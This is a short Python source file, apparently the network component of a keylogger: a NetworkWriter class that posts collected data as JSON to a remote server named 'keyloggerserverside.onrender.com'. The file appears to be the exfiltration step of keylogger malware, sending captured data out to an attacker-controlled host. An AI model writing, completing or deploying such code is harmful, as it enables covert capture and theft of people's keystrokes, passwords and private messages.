from .writer_interface import IWriter
import requests
import json
import os
from dotenv import load_dotenv

load_dotenv()

server_url = "https://keyloggerserverside.onrender.com"
class NetworkWriter(IWriter):
    
    def write(self, data: dict):
        requests.post(f"{server_url}/data/insert_data", json=data)
        return True

